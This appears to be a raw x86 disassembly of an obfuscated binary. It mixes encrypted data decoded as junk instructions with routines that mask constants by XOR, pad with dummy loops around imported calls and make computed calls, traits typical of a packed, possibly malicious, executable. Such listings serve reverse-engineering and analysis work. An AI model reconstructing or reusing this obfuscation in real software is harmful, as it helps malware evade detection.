  4050aa:	and    DWORD PTR [ecx+0x28a33859],0x522fc072
  4050b4:	cmp    DWORD PTR [edx-0x1c],0x8ab2e1ce
  4050bb:	mov    eax,0x398a7707
  4050c0:	add    cl,ah
  4050c2:	jnp    0x4050a0
  4050c4:	or     BYTE PTR [ecx+0x64],al
  4050c7:	jae    0x405137
  4050c9:	inc    ebx
  4050ca:	inc    esi
  4050cb:	cwde   
  4050cc:	ja     0x405131
  4050ce:	ror    BYTE PTR [edi+0x16c68cad],1
  4050d4:	adc    ebx,DWORD PTR [eax-0x139446ac]
  4050da:	or     eax,0x9e418207
  4050df:	xchg   esp,eax
  4050e0:	pminsw mm5,QWORD PTR [edx+0x11]
  4050e4:	aas    
  4050e5:	mov    ds,WORD PTR [eax]
  4050e7:	mov    al,ds:0xe66bad1a
  4050ec:	push   ds
  4050ed:	addr16 jne 0x4050a2
  4050f0:	sbb    eax,0x769f7a1d
  4050f5:	lock sahf 
  4050f7:	mov    esp,0xec02aa5
  4050fc:	add    bh,BYTE PTR [ebp+0x25]
  4050ff:	fwait
  405100:	pushf  
  405101:	mov    ds:0x8686a04c,al
  405106:	push   0xd717a15f
  40510b:	shl    BYTE PTR [esi-0x9],0xf9
  40510f:	and    ebp,DWORD PTR [ecx-0x7a]
  405112:	je     0x40518d
  405114:	push   ebx
  405115:	icebp  
  405116:	lock ins DWORD PTR es:[edi],dx
  405118:	ftst   
  40511a:	shl    DWORD PTR [ecx-0x10dcd46b],1
  405120:	imul   edi,eax,0xffffffe6
  405123:	xchg   ecx,eax
  405124:	and    eax,DWORD PTR [ecx*1+0x20cb3b75]
  40512b:	div    BYTE PTR [ecx+0x728bd52f]
  405131:	arpl   bx,cx
  405133:	cdq    
  405134:	pop    edx
  405135:	add    al,BYTE PTR [eax-0x55]
  405138:	sbb    eax,0x8fa483c1
  40513d:	ins    DWORD PTR es:[edi],dx
  40513e:	pop    ebx
  40513f:	arpl   WORD PTR [ebx-0x31],ax
  405142:	(bad)  
  405143:	iret   
  405144:	mov    esi,0x28b3402c
  405149:	mov    eax,0x34fe76aa
  40514e:	mov    ah,0x38
  405150:	sbb    ebx,DWORD PTR [edx+0x136a1630]
  405156:	mov    bl,BYTE PTR [ebp+0x14]
  405159:	enter  0x6e4,0x8c
  40515d:	call   0xe981:0xfa45dbf2
  405164:	push   edx
  405165:	ins    BYTE PTR es:[edi],dx
  405166:	xlat   BYTE PTR ds:[ebx]
  405167:	shl    ch,1
  405169:	ss jl  0x4051d6
  40516c:	fistp  DWORD PTR [ecx-0x20de074a]
  405172:	mov    edi,ds
  405174:	dec    edx
  405175:	aas    
  405176:	fcmove st,st(3)
  405178:	lds    ebp,FWORD PTR [eax+0xc]
  40517b:	and    ebp,DWORD PTR ds:0x3558501
  405181:	mov    al,bl
  405183:	dec    edi
  405184:	jae    0x405191
  405186:	mov    edi,ecx
  405188:	stos   BYTE PTR es:[edi],al
  405189:	ds aas 
  40518b:	(bad)  
  40518c:	fimul  DWORD PTR [eax+0xe]
  40518f:	(bad)  
  405190:	or     al,0x93
  405192:	mov    al,ds:0x1f7a4fd0
  405197:	add    DWORD PTR [edi-0x8ee061a],esi
  40519d:	and    ebp,DWORD PTR [ebp+ebx*8+0x4d7212b]
  4051a4:	nop
  4051a5:	mov    ebx,0x6513974f
  4051aa:	mov    al,ds:0xbec4b109
  4051af:	(bad)  
  4051b0:	push   ebx
  4051b1:	jg     0x40518a
  4051b3:	inc    DWORD PTR [ecx+0x7f7da43e]
  4051b9:	mov    cl,0x87
  4051bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051bc:	sub    eax,0xaa7db111
  4051c1:	inc    edi
  4051c2:	xchg   edx,eax
  4051c3:	and    DWORD PTR [edi-0x17963e21],0xb
  4051ca:	mov    esp,0x730fde29
  4051cf:	push   ds
  4051d0:	inc    eax
  4051d1:	inc    esi
  4051d2:	sbb    ebx,DWORD PTR [ebp-0x25669d18]
  4051d8:	cmp    DWORD PTR [ecx],edx
  4051da:	aad    0x3f
  4051dc:	adc    ebx,DWORD PTR [esi-0x72]
  4051df:	push   ss
  4051e0:	mov    ?,WORD PTR [ecx-0x7f3ebcbc]
  4051e6:	push   ecx
  4051e7:	inc    ecx
  4051e8:	xchg   BYTE PTR [ebx],bl
  4051ea:	mov    eax,0xcd8136dd
  4051ef:	lods   eax,DWORD PTR ds:[esi]
  4051f0:	in     al,dx
  4051f1:	dec    ecx
  4051f2:	cmp    ecx,DWORD PTR [ebp+0x51]
  4051f5:	push   edi
  4051f6:	mov    bh,0xa5
  4051f8:	push   eax
  4051f9:	cs xchg edi,eax
  4051fb:	dec    ebp
  4051fc:	loop   0x4051c2
  4051fe:	push   edx
  4051ff:	loopne 0x40520c
  405201:	stos   DWORD PTR es:[edi],eax
  405202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405203:	call   0x747049c2
  405208:	push   esi
  405209:	jno    0x4051fc
  40520b:	cmp    eax,0x9176acbf
  405211:	shl    BYTE PTR [ebx-0x1],1
  405214:	jl     0x4051d8
  405216:	in     al,dx
  405217:	lds    eax,FWORD PTR [edi+0x55]
  40521a:	test   BYTE PTR [edx],0x32
  40521d:	add    ch,ch
  40521f:	add    ah,BYTE PTR [ebp-0x4b]
  405222:	xor    eax,ebx
  405224:	add    eax,0x3272dc
  405229:	jmp    0x405392
  40522e:	mov    ecx,DWORD PTR [ebp-0x38]
  405231:	add    ecx,DWORD PTR [ebp+0x8]
  405234:	mov    DWORD PTR [ebp-0x10],ecx
  405237:	mov    ecx,DWORD PTR [ebp-0x1c]
  40523a:	test   ecx,ecx
  40523c:	je     0x40531d
  405242:	mov    DWORD PTR [ebp-0x20],0x0
  405249:	push   0x3
  40524b:	xor    edx,edx
  40524d:	pop    edx
  40524e:	add    edx,0x8
  405251:	push   edx
  405252:	pop    ecx
  405253:	push   0x6
  405255:	dec    ecx
  405256:	pop    ebx
  405257:	dec    ebx
  405258:	xchg   ebx,ecx
  40525a:	sub    ebx,ecx
  40525c:	xchg   ebx,ecx
  40525e:	dec    ecx
  40525f:	mov    eax,DWORD PTR [ebp-0x1c]
  405262:	imul   eax,ecx
  405265:	sub    esp,eax
  405267:	mov    DWORD PTR [ebp-0x20],esp
  40526a:	mov    eax,DWORD PTR [ebp-0x4]
  40526d:	mov    ecx,0x7510894
  405272:	xor    eax,ecx
  405274:	mov    edx,0x3272dc
  405279:	add    eax,edx
  40527b:	mov    DWORD PTR [ebp+0x8],eax
  40527e:	mov    eax,DWORD PTR [ebp-0x14]
  405281:	xor    eax,ecx
  405283:	add    eax,edx
  405285:	mov    edx,DWORD PTR [ebp+0x14]
  405288:	imul   eax,DWORD PTR [edx]
  40528b:	mov    edx,DWORD PTR [ebp-0x4]
  40528e:	xor    edx,ecx
  405290:	mov    ecx,DWORD PTR [ebp+0x8]
  405293:	lea    ecx,[edx+ecx*1+0x3272dc]
  40529a:	cmp    ecx,eax
  40529c:	je     0x405313
  4052a2:	mov    edi,DWORD PTR [ebp-0x14]
  4052a5:	mov    eax,DWORD PTR [ebp+0x8]
  4052a8:	mov    edx,DWORD PTR [ebp+0x14]
  4052ab:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052af:	mov    ecx,0x7510894
  4052b4:	xor    edx,edx
  4052b6:	xor    edi,ecx
  4052b8:	mov    esi,0x3272dc
  4052bd:	add    edi,esi
  4052bf:	div    edi
  4052c1:	mov    edx,DWORD PTR [ebp-0x4]
  4052c4:	xor    edx,ecx
  4052c6:	lea    eax,[edx+eax*1+0x3272dc]
  4052cd:	mov    edx,DWORD PTR [ebp+0x8]
  4052d0:	mov    edi,DWORD PTR [ebp-0x20]
  4052d3:	mov    DWORD PTR [edi+edx*4],eax
  4052d6:	mov    eax,DWORD PTR [ebp-0x14]
  4052d9:	mov    edx,DWORD PTR [ebp+0x8]
  4052dc:	xor    eax,ecx
  4052de:	lea    eax,[eax+edx*1+0x3272dc]
  4052e5:	mov    DWORD PTR [ebp+0x8],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x14]
  4052eb:	mov    edx,DWORD PTR [ebp+0x14]
  4052ee:	xor    eax,ecx
  4052f0:	add    eax,esi
  4052f2:	imul   eax,DWORD PTR [edx]
  4052f5:	mov    edx,DWORD PTR [ebp-0x4]
  4052f8:	xor    edx,ecx
  4052fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4052fd:	lea    ecx,[edx+ecx*1+0x3272dc]
  405304:	cmp    ecx,eax
  405306:	jne    0x4052a2
  40530c:	mov    eax,esi
  40530e:	jmp    0x405318
  405313:	mov    eax,0x3272dc
  405318:	mov    ebx,0x7510894
  40531d:	mov    ecx,DWORD PTR [ebp-0x4]
  405320:	xor    ecx,ebx
  405322:	add    ecx,eax
  405324:	mov    DWORD PTR [ebp-0xc],ecx
  405327:	mov    ebx,0x65655
  40532c:	add    ebx,0x3234
  405332:	xchg   ebx,esi
  405334:	xor    ebx,ebx
  405336:	push   esi
  405337:	mov    esi,ebx
  405339:	pop    ebx
  40533a:	mov    edx,esi
  40533c:	add    ebx,0x1002
  405342:	lea    eax,[ebp-0x10]
  405345:	add    edx,eax
  405347:	add    edx,0x5
  40534a:	push   edx
  40534b:	inc    esi
  40534c:	pop    ecx
  40534d:	dec    ecx
  40534e:	xchg   ecx,eax
  40534f:	dec    eax
  405350:	xchg   ecx,eax
  405351:	dec    ecx
  405352:	xchg   ecx,edx
  405354:	dec    edx
  405355:	push   edx
  405356:	mov    edx,ebx
  405358:	pop    ebx
  405359:	dec    ebx
  40535a:	call   DWORD PTR [ebx]
  40535c:	cmp    DWORD PTR [ebp+0x10],esi
  40535f:	je     0x40537e
  405365:	xchg   edx,eax
  405366:	push   0xb
  405368:	pop    ecx
  405369:	push   0x4
  40536b:	pop    ebx
  40536c:	inc    ebx
  40536d:	xchg   ebx,ecx
  40536f:	sub    ebx,ecx
  405371:	xchg   ebx,ecx
  405373:	dec    ecx
  405374:	dec    ecx
  405375:	mov    eax,DWORD PTR [ebp-0x1c]
  405378:	imul   eax,ecx
  40537b:	add    esp,eax
  40537d:	xchg   edx,eax
  40537e:	push   eax
  40537f:	xor    ebx,ebx
  405381:	mov    edx,esp
  405383:	dec    edx
  405384:	inc    ebx
  405385:	add    ebx,DWORD PTR [edx+ebx*1]
  405388:	dec    ebx
  405389:	xor    edx,edx
  40538b:	add    DWORD PTR [ebp-0xc],ebx
  40538e:	pop    ebx
  40538f:	mov    eax,DWORD PTR [ebp-0xc]
  405392:	pop    edi
  405393:	pop    esi
  405394:	pop    ebx
  405395:	leave  
  405396:	ret    0x10
  405399:	push   ebp
  40539a:	mov    ebp,esp
  40539c:	sub    esp,0x18
  40539f:	and    DWORD PTR ds:0x413c1e,0x0
  4053a9:	mov    ecx,DWORD PTR ds:0x413c1e
  4053af:	inc    ecx
  4053b0:	mov    DWORD PTR ds:0x413c1e,ecx
  4053b6:	cmp    DWORD PTR ds:0x413c1e,0x8
  4053bd:	jne    0x4053d7
  4053c3:	push   DWORD PTR [ebp-0x20]
  4053c6:	push   0x413cf0
  4053cb:	push   DWORD PTR [ebp-0x24]
  4053ce:	push   DWORD PTR [ebp-0x14]
  4053d1:	call   DWORD PTR ds:0x416770
  4053d7:	cmp    DWORD PTR ds:0x413c1e,0x7
  4053de:	jne    0x4053f3
  4053e4:	xor    ecx,ecx
  4053e6:	or     ecx,DWORD PTR ds:0x413c1e
  4053ec:	inc    ecx
  4053ed:	mov    DWORD PTR ds:0x413c1e,ecx
  4053f3:	cmp    DWORD PTR ds:0x413c1e,0x1f
  4053fa:	jb     0x4053a9
  405400:	and    DWORD PTR ds:0x413c12,ecx
  405406:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  40540d:	xor    edx,edx
  40540f:	or     edx,DWORD PTR ds:0x413cc0
  405415:	mov    edx,DWORD PTR [edx]
  405417:	and    DWORD PTR ds:0x413ce8,edx
  40541d:	lea    eax,[ebp+0x14]
  405420:	mov    DWORD PTR [ebp-0x4],eax
  405423:	push   esi
  405424:	adc    edx,ecx
  405426:	mov    esi,0xf89c85b0
  40542b:	mov    DWORD PTR [ebp-0xc],esi
  40542e:	and    DWORD PTR ds:0x413c74,0x0
  405438:	jmp    0x40544a
  40543d:	mov    edx,DWORD PTR ds:0x413c74
  405443:	inc    edx
  405444:	mov    DWORD PTR ds:0x413c74,edx
  40544a:	cmp    DWORD PTR ds:0x413c74,0x1a
  405451:	jae    0x405550
  405457:	cmp    DWORD PTR ds:0x413c74,0x10
  40545e:	jne    0x40547c
  405464:	push   0x41401c
  405469:	push   DWORD PTR [ebp-0x14]
  40546c:	push   0x416140
  405471:	push   0x4161b2
  405476:	call   DWORD PTR ds:0x416774
  40547c:	cmp    DWORD PTR ds:0x413c74,0xf
  405483:	jne    0x405498
  405489:	xor    edx,edx
  40548b:	add    edx,DWORD PTR ds:0x413c74
  405491:	inc    edx
  405492:	mov    DWORD PTR ds:0x413c74,edx
  405498:	jmp    0x40543d
  40549d:	and    DWORD PTR ds:0x413c0e,0x0
  4054a7:	jmp    0x4054b9
  4054ac:	mov    ecx,DWORD PTR ds:0x413c0e
  4054b2:	inc    ecx
  4054b3:	mov    DWORD PTR ds:0x413c0e,ecx
  4054b9:	cmp    DWORD PTR ds:0x413c0e,0x16
  4054c0:	jae    0x405550
  4054c6:	cmp    DWORD PTR ds:0x413c0e,0x7
  4054cd:	jne    0x4054e8
  4054d3:	push   0x1925
  4054d8:	push   0x413c1a
  4054dd:	push   0x416140
  4054e2:	call   DWORD PTR ds:0x416778
  4054e8:	cmp    DWORD PTR ds:0x413c0e,0x6
  4054ef:	jne    0x405504
  4054f5:	xor    ecx,ecx
  4054f7:	or     ecx,DWORD PTR ds:0x413c0e
  4054fd:	inc    ecx
  4054fe:	mov    DWORD PTR ds:0x413c0e,ecx
  405504:	jmp    0x4054ac
  405509:	mov    DWORD PTR ds:0x413d1c,0x15
  405513:	cmp    DWORD PTR ds:0x413d1c,0x0
  40551a:	je     0x405550
  405520:	cmp    DWORD PTR ds:0x413d1c,0x21
  405527:	jne    0x405538
  40552d:	push   0x416025
  405532:	call   DWORD PTR ds:0x41677c
  405538:	mov    ecx,DWORD PTR ds:0x413d1c
  40553e:	dec    ecx
  40553f:	mov    DWORD PTR ds:0x413d1c,ecx
  405545:	jmp    0x405513
  40554a:	adc    edx,0x7769
  405550:	lea    eax,[ebp-0xc]
  405553:	mov    DWORD PTR [ebp-0x14],eax
  405556:	or     eax,DWORD PTR ds:0x413c0a
  40555c:	mov    eax,DWORD PTR [ebp-0xc]
  40555f:	and    edx,edx
  405561:	mov    edx,DWORD PTR [ebp-0x14]
  405564:	mov    ecx,0x7510894
  405569:	xor    eax,ecx
  40556b:	add    eax,0x3272dc
  405570:	mov    DWORD PTR [edx],eax
  405572:	and    DWORD PTR ds:0x413d34,0x0
  40557c:	jmp    0x40558c
  405581:	mov    eax,ds:0x413d34
  405586:	inc    eax
  405587:	mov    ds:0x413d34,eax
  40558c:	cmp    DWORD PTR ds:0x413d34,0x17
  405593:	jae    0x4055dc
  405599:	cmp    DWORD PTR ds:0x413d34,0x8
  4055a0:	jne    0x4055b9
  4055a6:	push   0x413cec
  4055ab:	push   DWORD PTR [ebp-0x24]
  4055ae:	push   0x416049
  4055b3:	call   DWORD PTR ds:0x416780
  4055b9:	cmp    DWORD PTR ds:0x413d34,0x7
  4055c0:	jne    0x4055d1
  4055c6:	mov    eax,ds:0x413d34
  4055cb:	inc    eax
  4055cc:	mov    ds:0x413d34,eax
  4055d1:	jmp    0x405581
  4055d6:	and    edx,DWORD PTR ds:0x413bfe
  4055dc:	mov    eax,ds:0x41622c
  4055e1:	mov    edx,DWORD PTR [ebp-0x4]
  4055e4:	add    DWORD PTR ds:0x413bf6,0x4ad3
  4055ee:	mov    eax,DWORD PTR [eax]
  4055f0:	add    eax,DWORD PTR [edx]
  4055f2:	sbb    DWORD PTR ds:0x413c80,0x777b
  4055fc:	push   edi
  4055fd:	xor    DWORD PTR ds:0x413c06,ebx
  405603:	mov    DWORD PTR [ebp-0x8],eax
  405606:	mov    edi,DWORD PTR [ebp+0x8]
  405609:	movzx  eax,BYTE PTR ds:0x413d28
  405610:	sub    DWORD PTR ds:0x413c06,eax
  405616:	mov    eax,ds:0x4163b4
  40561b:	mov    eax,DWORD PTR [eax+0x198]
  405621:	adc    edx,DWORD PTR ds:0x414010
  405627:	xor    edi,ecx
  405629:	mov    edx,0x3272dc
  40562e:	add    DWORD PTR ds:0x413c1a,0x413cd8
  405638:	add    edi,edx
  40563a:	mov    DWORD PTR ds:0x413d28,0x4988
  405644:	cmp    DWORD PTR [eax],edi
  405646:	je     0x40565d
  40564c:	mov    eax,DWORD PTR [eax]
  40564e:	mov    DWORD PTR ds:0x413ce4,0xf81
  405658:	jmp    0x407c4a
  40565d:	mov    eax,DWORD PTR [ebp+0x18]
  405660:	mov    DWORD PTR ds:0x413c06,0x7bbf
  40566a:	cmp    eax,esi
  40566c:	mov    DWORD PTR ds:0x413d30,0x2bf7
  405676:	jne    0x405686
  40567c:	push   0xf89c85b1
  405681:	jmp    0x407c39
  405686:	mov    esi,DWORD PTR [ebp+0x18]
  405689:	movzx  eax,WORD PTR ds:0x413cf0
  405690:	mov    eax,0xf89c85b2
  405695:	cmp    esi,eax
  405697:	jne    0x407c29
  40569d:	mov    eax,DWORD PTR [ebp+0x10]
  4056a0:	inc    DWORD PTR ds:0x413c80
  4056a6:	xor    eax,ecx
  4056a8:	add    eax,edx
  4056aa:	mov    DWORD PTR [ebp-0x18],eax
  4056ad:	adc    DWORD PTR ds:0x413d1c,0x3347
  4056b7:	mov    eax,DWORD PTR [ebp+0xc]
  4056ba:	mov    esi,DWORD PTR [ebp-0x8]
  4056bd:	xor    eax,ecx
  4056bf:	sbb    DWORD PTR ds:0x413ce4,0x413c70
  4056c9:	add    eax,edx
  4056cb:	imul   eax,DWORD PTR [esi]
  4056ce:	and    DWORD PTR ds:0x413c0a,ebx
  4056d4:	mov    esi,DWORD PTR [ebp+0x8]
  4056d7:	and    DWORD PTR ds:0x413d24,0x413c02
  4056e1:	xor    esi,ecx
  4056e3:	add    esi,edx
  4056e5:	cmp    esi,eax
  4056e7:	movzx  eax,BYTE PTR ds:0x413cf0
  4056ee:	mov    eax,DWORD PTR [ebp-0x4]
  4056f1:	push   ebx
  4056f2:	mov    DWORD PTR ds:0x414000,0x6197
  4056fc:	je     0x40577e
  405702:	and    DWORD PTR ds:0x413c1e,0x0
  40570c:	jmp    0x40571e
  405711:	mov    esi,DWORD PTR ds:0x413c1e
  405717:	inc    esi
  405718:	mov    DWORD PTR ds:0x413c1e,esi
  40571e:	cmp    DWORD PTR ds:0x413c1e,0x14
  405725:	jae    0x405765
  40572b:	cmp    DWORD PTR ds:0x413c1e,0xa
  405732:	jne    0x405746
  405738:	push   0x413d1c
  40573d:	push   DWORD PTR [ebp-0x24]
  405740:	call   DWORD PTR ds:0x416784
  405746:	cmp    DWORD PTR ds:0x413c1e,0x9
  40574d:	jne    0x405760
  405753:	mov    esi,DWORD PTR ds:0x413c1e
  405759:	inc    esi
  40575a:	mov    DWORD PTR ds:0x413c1e,esi
  405760:	jmp    0x405711
  405765:	mov    esi,DWORD PTR [ebp-0x18]
  405768:	add    DWORD PTR [eax],esi
  40576a:	mov    eax,DWORD PTR [ebp-0x4]
  40576d:	mov    esi,DWORD PTR [ebp+0xc]
  405770:	xor    esi,ecx
  405772:	add    esi,edx
  405774:	imul   esi,DWORD PTR [eax]
  405777:	mov    DWORD PTR [eax],esi
  405779:	jmp    0x405783
  40577e:	mov    esi,DWORD PTR [ebp+0x14]
  405781:	xor    DWORD PTR [eax],esi
  405783:	mov    eax,DWORD PTR [ebp-0x4]
  405786:	mov    edi,DWORD PTR [ebp+0x10]
  405789:	xor    edi,ecx
  40578b:	mov    esi,0xffcd8d24
  405790:	mov    ebx,esi
  405792:	sub    ebx,edi
  405794:	add    DWORD PTR [eax],ebx
  405796:	mov    eax,DWORD PTR [ebp-0x4]
  405799:	mov    edi,DWORD PTR [ebp-0x8]
  40579c:	add    edi,DWORD PTR [eax]
  40579e:	mov    DWORD PTR [ebp-0x8],edi
  4057a1:	mov    eax,DWORD PTR [ebp+0xc]
  4057a4:	mov    edi,DWORD PTR [ebp+0xc]
  4057a7:	xor    edi,ecx
  4057a9:	xor    eax,ecx
  4057ab:	lea    eax,[eax+edi*1+0x64e5b8]
  4057b2:	mov    edi,DWORD PTR [ebp+0xc]
  4057b5:	xor    edi,ecx
  4057b7:	add    edi,edx
  4057b9:	imul   eax,edi
  4057bc:	mov    edi,DWORD PTR [ebp+0xc]
  4057bf:	xor    edi,ecx
  4057c1:	sub    edi,eax
  4057c3:	mov    eax,DWORD PTR [ebp-0x4]
  4057c6:	add    edi,edx
  4057c8:	cmp    DWORD PTR [eax],edi
  4057ca:	mov    eax,DWORD PTR [ebp-0x4]
  4057cd:	mov    edi,DWORD PTR [ebp+0x10]
  4057d0:	jg     0x4057e3
  4057d6:	xor    edi,ecx
  4057d8:	mov    ebx,esi
  4057da:	sub    ebx,edi
  4057dc:	add    DWORD PTR [eax],ebx
  4057de:	jmp    0x4057e9
  4057e3:	xor    edi,ecx
  4057e5:	add    edi,edx
  4057e7:	add    DWORD PTR [eax],edi
  4057e9:	mov    eax,DWORD PTR [ebp-0x8]
  4057ec:	mov    edi,DWORD PTR [ebp-0x10]
  4057ef:	mov    eax,DWORD PTR [eax]
  4057f1:	jmp    0x407b3d
  4057f6:	imul   ebp,DWORD PTR [edx+0x66],0xaba967a5
  4057fd:	stos   BYTE PTR es:[edi],al
  4057fe:	(bad)  
  4057ff:	sbb    eax,0x651094ee
  405804:	pop    esp
  405805:	shl    eax,0x5f
  405808:	jl     0x405886
  40580a:	dec    ebx
  40580b:	pop    edi
  40580c:	jl     0x40588a
  40580e:	xor    BYTE PTR [ecx-0x671859b8],bl
  405814:	mov    dl,BYTE PTR [esi-0x5d]
  405817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405818:	xchg   ecx,eax
  405819:	pop    ebp
  40581a:	aaa    
  40581b:	mov    ch,0x80
  40581d:	pop    ds
  40581e:	in     al,dx
  40581f:	jle    0x405825
  405821:	pop    ss
  405822:	xrelease xchg BYTE PTR [edi+0x2e],cl
  405826:	test   eax,0xd476e40a
  40582b:	inc    edx
  40582c:	stos   BYTE PTR es:[edi],al
  40582d:	call   0x4d6:0xba425ee7
  405834:	test   DWORD PTR [ebp+edi*8-0x1f2c4ef2],edx
  40583b:	jnp    0x405809
  40583d:	push   es
  40583e:	or     al,0xb5
  405840:	mov    eax,ds:0x74f93df6
  405845:	sbb    ch,ah
  405847:	pop    ebp
  405848:	inc    ebp
  405849:	nop
  40584a:	jle    0x40581e
  40584c:	jo     0x40584c
  40584e:	aam    0x3c
  405850:	inc    ebp
  405851:	retf   
  405852:	jo     0x405870
  405854:	in     eax,dx
  405855:	jbe    0x4057e0
  405857:	pop    edi
  405858:	jmp    0x95c860ab
  40585d:	fadd   DWORD PTR [edi]
  40585f:	(bad)  
  405860:	mov    ds:0x1e1f8dda,al
  405865:	cmovp  edx,DWORD PTR [ecx-0x18c09b2a]
  40586c:	stos   DWORD PTR es:[edi],eax
  40586d:	and    al,BYTE PTR [edi]
  40586f:	popf   
  405870:	fwait
  405871:	push   edx
  405872:	outs   dx,DWORD PTR ds:[esi]
  405873:	push   esi
  405874:	or     BYTE PTR [ebx],dl
  405876:	iret   
  405877:	aam    0x65
  405879:	aad    0x14
  40587b:	dec    eax
  40587c:	and    ch,BYTE PTR [ebp+eax*2-0x41]
  405880:	in     al,0x8b
  405882:	ss dec eax
  405884:	je     0x4058bd
  405886:	call   0xb53bdf45
  40588b:	jle    0x4058a7
  40588d:	ins    BYTE PTR es:[edi],dx
  40588e:	pop    ss
  40588f:	jmp    0xafa2427a
  405894:	fucomi st,st(5)
  405896:	sub    eax,0xcdf283e8
  40589b:	jnp    0x405861
  40589d:	adc    DWORD PTR [edx],ebp
  40589f:	and    eax,0x9bd7a2b7
  4058a4:	inc    edi
  4058a5:	and    eax,0x5a502d1f
  4058aa:	ret    
  4058ab:	inc    ecx
  4058ac:	sub    al,0xc6
  4058ae:	sub    al,0x17
  4058b0:	cmp    DWORD PTR [edi],0x2d
  4058b3:	out    0x6e,al
  4058b5:	int3   
  4058b6:	data16 xchg BYTE PTR [ecx+0x12],cl
  4058ba:	push   cs
  4058bb:	pop    ds
  4058bc:	imul   ebp,eax,0xffffff9f
  4058bf:	sub    al,0xa2
  4058c1:	cmp    DWORD PTR [edi],eax
  4058c3:	out    dx,al
  4058c4:	arpl   WORD PTR [ecx],bx
  4058c6:	mov    dl,0x2a
  4058c8:	mov    ebp,0xa88c664e
  4058cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ce:	jge    0x4058d6
  4058d0:	mov    esp,0x50562e55
  4058d5:	outs   dx,BYTE PTR ds:[esi]
  4058d6:	or     DWORD PTR [esi+ebx*2],0xffffffb6
  4058da:	mov    esi,DWORD PTR [ecx]
  4058dc:	rol    BYTE PTR [edi+0x55],0xbf
  4058e0:	je     0x4058ee
  4058e2:	inc    ecx
  4058e3:	mov    ah,0x78
  4058e5:	jno    0x4058db
  4058e7:	push   cs
  4058e8:	push   DWORD PTR [ebp+eax*4-0x8076f92]
  4058ef:	leave  
  4058f0:	and    al,0x91
  4058f2:	stc    
  4058f3:	in     al,dx
  4058f4:	fcom   DWORD PTR [esi]
  4058f6:	(bad)  
  4058f8:	sub    eax,0x1a0ffc38
  4058fd:	or     DWORD PTR [edx-0x2f],ecx
  405900:	add    DWORD PTR [esi+0xc],eax
  405903:	fidiv  DWORD PTR [edx+esi*2-0x33]
  405907:	sbb    al,0xdb
  405909:	sahf   
  40590a:	push   ecx
  40590b:	out    dx,al
  40590c:	sbb    esi,ecx
  40590e:	popf   
  40590f:	mov    esi,0xc535bed5
  405914:	add    esi,DWORD PTR [eax+0x76d9b77a]
  40591a:	cwde   
  40591b:	rcl    edx,0x78
  40591e:	cli    
  40591f:	pushf  
  405920:	stos   BYTE PTR es:[edi],al
  405921:	(bad)  
  405922:	sbb    al,ah
  405924:	cwde   
  405925:	fs clc 
  405927:	in     al,dx
  405928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405929:	lock and bh,0x5e
  40592d:	clc    
  40592e:	in     eax,0xd7
  405930:	cmp    al,BYTE PTR [ebp+ebx*1-0x43729bf8]
  405937:	xchg   edi,eax
  405938:	ins    BYTE PTR es:[edi],dx
  405939:	mov    bh,0x83
  40593b:	daa    
  40593c:	pop    es
  40593d:	and    BYTE PTR [ebp-0x3fef31da],bl
  405943:	jmp    0x40598d
  405945:	add    BYTE PTR [eax-0x6e],cl
  405948:	hlt    
  405949:	push   ecx
  40594a:	push   0x5f0e1d1a
  40594f:	test   DWORD PTR [ebp-0x4c31dea9],ecx
  405955:	jne    0x40592a
  405957:	adc    BYTE PTR [eax+0x1acebdcd],ch
  40595d:	mov    al,BYTE PTR [ebp-0x1a]
  405960:	inc    esi
  405961:	mov    eax,0x84db35e4
  405966:	mov    bl,0x51
  405968:	sub    ecx,ebx
  40596a:	sbb    ah,BYTE PTR [edi+0x25e8b7d5]
  405970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405971:	sti    
  405972:	sub    eax,0x5484013
  405977:	mov    dh,0x8c
  40597a:	and    esp,ebp
  40597c:	psrad  mm3,QWORD PTR [eax]
  40597f:	popf   
  405980:	in     eax,dx
  405981:	dec    eax
  405982:	adc    eax,0x1a164d51
  405987:	jl     0x40590b
  405989:	dec    ebp
  40598a:	mov    eax,0xc40ed5e6
  40598f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405990:	in     eax,dx
  405991:	test   eax,0x9d09ac6d
  405996:	stos   DWORD PTR es:[edi],eax
  405997:	retf   0xfa11
  40599a:	inc    esp
  40599b:	(bad)  
  40599d:	icebp  
  40599e:	fidiv  DWORD PTR [edx+0x66bcd639]
  4059a4:	popa   
  4059a5:	inc    edi
  4059a6:	icebp  
  4059a7:	adc    esi,ebp
  4059a9:	loopne 0x405982
  4059ab:	xchg   ecx,eax
  4059ac:	xor    DWORD PTR [edx-0x33b71359],0x66076497
  4059b6:	or     eax,0xd35a49cd
  4059bb:	ror    DWORD PTR ds:0x917bb3b5,1
  4059c1:	or     eax,0xfdbe2bbb
  4059c6:	add    cl,BYTE PTR [ebp+ebx*8-0x10]
  4059ca:	out    0xf3,al
  4059cc:	and    bl,BYTE PTR [ebx+0x22a2cfaa]
  4059d2:	mov    ch,0xf8
  4059d4:	clc    
  4059d5:	pop    edx
  4059d6:	add    dh,cl
  4059d8:	out    dx,al
  4059d9:	push   ds
  4059da:	mov    ah,0x3a
  4059dc:	inc    ebx
  4059dd:	jle    0x4059e6
  4059df:	shl    edi,cl
  4059e1:	popf   
  4059e2:	and    al,0x83
  4059e4:	dec    ebp
  4059e5:	mov    ebp,DWORD PTR [ebp-0x640497d4]
  4059eb:	jns    0x4059d0
  4059ed:	push   ds
  4059ee:	push   ds
  4059ef:	add    esi,DWORD PTR [edi+0x7df1b531]
  4059f5:	mov    edi,0x4101f9e7
  4059fa:	bound  ebp,QWORD PTR ds:0xb4b55c84
  405a00:	dec    edx
  405a01:	or     eax,DWORD PTR [ebx+0x24]
  405a04:	inc    edx
  405a05:	jecxz  0x405a3f
  405a07:	les    eax,FWORD PTR [ebx+0x5c]
  405a0a:	push   esi
  405a0b:	adc    BYTE PTR [edi-0x78ebbb3a],dh
  405a11:	ror    bh,1
  405a13:	leave  
  405a14:	call   FWORD PTR [ebp-0x37]
  405a17:	mov    esp,0xc3773d75
